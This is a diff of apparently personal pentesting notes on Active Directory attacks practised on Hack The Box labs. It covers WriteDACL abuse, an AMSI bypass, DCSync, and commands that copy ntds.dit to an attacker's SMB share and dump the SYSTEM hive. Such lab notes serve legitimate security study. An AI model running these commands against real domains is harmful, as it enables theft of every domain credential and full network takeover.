@@ -992,19 +992,57 @@ Profit
 ## 4. NTDS.dit and System.hive
 Description: With these files and the appropriate permissions, an attacker can dump hashes from the Domain Controller using DCSync.
 Environment: Blackfield from Hackthebox
-Timestamp: 34:38
+
+Instead of creating a new mount like conda, another way that Unkown Artists shows off is to use wbadmin backup tool to backup to smb shares
+
+from evil-winrm
+copy to your smb share
+`echo "Y" | wbadmin start backup -backuptarget:\\<your-ip>\<share> -include:c:\windows\ntds`
+Get version identifier of the share you just made
+`wbadmin get versions`
+Start recovery with:
+`echo "Y"|webadmin start recovery -version:<version-identifier> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:c:\ -notrestoreacl`
+get hive
+`reg save HKLM\\SYSTEM c:\system.hive`
+copy
+
+This involves SMB stuff that seemed to not work well for him, try conda's way first.
 
 ## 3.Account Operators/WriteDACL
 Description: In the account operators group, an attacker can create users and place them in non-protected groups. Placing a new user in a group with WriteDACL, enables an attacker to modify the new user's DACL. In this example, we give our new user DCSync rights.
 Environment: Forest from Hackthebox 
-Timestamp: 42:24
+
+Finds that Exchange Windows Permissions is an non-protected group that have WriteDACL 
+
+![image](https://user-images.githubusercontent.com/83407557/186469340-9dfff867-ee26-4bfd-a1b2-504180d5e5be.png)
+
+
 
 ## 2. ByPassing AMSI 
 Description: It may be necessary to bypass the anti-virus in Active Directory. Attackers can attempt to bypass AMSI with the Bypass-4MSI command in Evil-WinRM. Always run this command before introducing a malicious script to the environment. 
 Environment: Forest from Hackthebox
 Timestamp: 48:11
 
+![image](https://user-images.githubusercontent.com/83407557/186469790-81ec4863-cbfc-4537-8d89-e21283491100.png)
+
+
 ## 1. DCSYNC/GetChangesAll/Replication
 Description: This is number one because its the most fun. DCSync allows an attacker to impersonate a Failover Domain Controller. In that context, the production Domain Controller shares all user hashes upon request, ergo DCSYNC. GetChangesAll, Replication and AllowedToDelegate all point toward the possibility of DCSYNC.
 Environment: Forest/Sizzle 
 Timestamp: 53:14
+
+creat user with dcsync rights
+![image](https://user-images.githubusercontent.com/83407557/186470753-8541ac30-527f-4077-a06c-754d89b0c771.png)
+
+then dcsyn with that new user 
+
+![image](https://user-images.githubusercontent.com/83407557/186471061-f985b173-1b81-4a38-85e0-63092f02424f.png)
+
+
+getchangesall
+
+![image](https://user-images.githubusercontent.com/83407557/186471466-8055eee3-7e11-4fbc-a1fe-7e32042fc043.png)
+
+![image](https://user-images.githubusercontent.com/83407557/186471764-4c7f734b-bcac-4811-9b6d-6efe05b6e6db.png)
+
+![image](https://user-images.githubusercontent.com/83407557/186471845-ed16cd8b-56db-4946-af18-5e6400accfe5.png)
